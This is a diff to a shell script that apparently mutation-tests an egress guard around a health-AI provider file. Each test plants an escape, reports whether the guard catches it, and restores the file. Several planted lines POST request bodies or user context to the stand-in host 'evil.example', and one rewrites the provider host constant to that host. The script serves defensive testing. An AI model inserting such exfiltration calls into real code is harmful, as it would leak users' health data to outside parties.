@@ -32,9 +32,11 @@ PY
 report "M3b template-literal fetch in synthetic.ts" "$(run)"
 cp "$BAK" supabase/functions/_shared/health/ai/synthetic.ts
 
-# M4b: new ai/vertex.ts importing ../../fetchTimeout.ts, imported by gateway.ts
+# M4b: new ai/net.ts importing ../../fetchTimeout.ts, imported by gateway.ts
+# (Was ai/vertex.ts until Phase 3 made that the REAL provider file; the escape
+# keeps its shape under a new name, and M9/M10 below attack the real one.)
 cp supabase/functions/_shared/health/ai/gateway.ts "$BAK"
-cat > supabase/functions/_shared/health/ai/vertex.ts <<'TS'
+cat > supabase/functions/_shared/health/ai/net.ts <<'TS'
 import { fetchWithTimeout } from "../../fetchTimeout.ts";
 export async function send(body: unknown) {
   return await fetchWithTimeout("https://evil.example/c", { method: "POST", body: JSON.stringify(body) }, 5000);
@@ -44,26 +46,64 @@ python3 - <<'PY'
 p='supabase/functions/_shared/health/ai/gateway.ts'; s=open(p).read()
 old='import { costEstimateUsd } from "./cost.ts";'
 assert s.count(old)==1
-s=s.replace(old, old+'\nimport { send } from "./vertex.ts";\nvoid send;')
+s=s.replace(old, old+'\nimport { send } from "./net.ts";\nvoid send;')
 open(p,'w').write(s)
 PY
-report "M4b ai/vertex.ts -> ../../fetchTimeout.ts" "$(run)"
-cp "$BAK" supabase/functions/_shared/health/ai/gateway.ts; rm -f supabase/functions/_shared/health/ai/vertex.ts
+report "M4b ai/net.ts -> ../../fetchTimeout.ts" "$(run)"
+cp "$BAK" supabase/functions/_shared/health/ai/gateway.ts; rm -f supabase/functions/_shared/health/ai/net.ts
 
 # M4c: the same file but with NO egress word at all — import-only escape
 cp supabase/functions/_shared/health/ai/gateway.ts "$BAK"
-cat > supabase/functions/_shared/health/ai/vertex.ts <<'TS'
+cat > supabase/functions/_shared/health/ai/net.ts <<'TS'
 import { withTimeout } from "../../fetchTimeout.ts";
 export const x = withTimeout;
 TS
 python3 - <<'PY'
 p='supabase/functions/_shared/health/ai/gateway.ts'; s=open(p).read()
 old='import { costEstimateUsd } from "./cost.ts";'
-s=s.replace(old, old+'\nimport { x } from "./vertex.ts";\nvoid x;')
+s=s.replace(old, old+'\nimport { x } from "./net.ts";\nvoid x;')
 open(p,'w').write(s)
 PY
 report "M4c import-only escape through a new ai/ file" "$(run)"
-cp "$BAK" supabase/functions/_shared/health/ai/gateway.ts; rm -f supabase/functions/_shared/health/ai/vertex.ts
+cp "$BAK" supabase/functions/_shared/health/ai/gateway.ts; rm -f supabase/functions/_shared/health/ai/net.ts
+
+# M9: a SECOND host inside the real provider file (Phase 3) — the one file
+# allowed a fetch may reach exactly one host, and this is the escape a
+# "helpful" edit would make: log the context to somewhere else on the way.
+cp supabase/functions/_shared/health/ai/vertex.ts "$BAK"
+python3 - <<'PY'
+p='supabase/functions/_shared/health/ai/vertex.ts'; s=open(p).read()
+old='    const auth = await this.token();'
+assert s.count(old)==1
+s=s.replace(old, old+'\n    void fetch("https://evil.example/c", { method: "POST", body: JSON.stringify(input.context) });')
+open(p,'w').write(s)
+PY
+report "M9 a second fetch host inside ai/vertex.ts" "$(run)"
+cp "$BAK" supabase/functions/_shared/health/ai/vertex.ts
+
+# M10: the real provider file reaching a module outside its two named ones
+cp supabase/functions/_shared/health/ai/vertex.ts "$BAK"
+python3 - <<'PY'
+p='supabase/functions/_shared/health/ai/vertex.ts'; s=open(p).read()
+old='import { vertexErrorDetail } from "../../vertexError.ts";'
+assert s.count(old)==1
+s=s.replace(old, old+'\nimport { fetchWithTimeout } from "../../fetchTimeout.ts";\nvoid fetchWithTimeout;')
+open(p,'w').write(s)
+PY
+report "M10 ai/vertex.ts importing a third outside module" "$(run)"
+cp "$BAK" supabase/functions/_shared/health/ai/vertex.ts
+
+# M11: the provider's transport pointed at a different host constant
+cp supabase/functions/_shared/health/ai/vertex.ts "$BAK"
+python3 - <<'PY'
+p='supabase/functions/_shared/health/ai/vertex.ts'; s=open(p).read()
+old='export const VERTEX_HOST = "aiplatform.googleapis.com";'
+assert s.count(old)==1
+s=s.replace(old, 'export const VERTEX_HOST = "evil.example";')
+open(p,'w').write(s)
+PY
+report "M11 VERTEX_HOST rewritten to another host" "$(run)"
+cp "$BAK" supabase/functions/_shared/health/ai/vertex.ts
 
 # M7: a sibling file in health-ai/
 cp supabase/functions/health-ai/index.ts "$BAK"
@@ -97,5 +137,5 @@ PY
   cp "$BAK" supabase/functions/health-ai/index.ts
 done
 
-echo "restored: $(git status --short supabase/functions | wc -l) changed paths under supabase/functions (expected: the 8 edited files, no vertex.ts/net.ts)"
-ls supabase/functions/health-ai supabase/functions/_shared/health/ai | grep -c 'vertex.ts\|net.ts' || true
+echo "restored: $(git status --short supabase/functions | wc -l) changed paths under supabase/functions (expected: whatever was already edited, and no net.ts)"
+echo "escape files left behind (expected 0): $(ls supabase/functions/health-ai supabase/functions/_shared/health/ai | grep -c '^net.ts$' || true)"
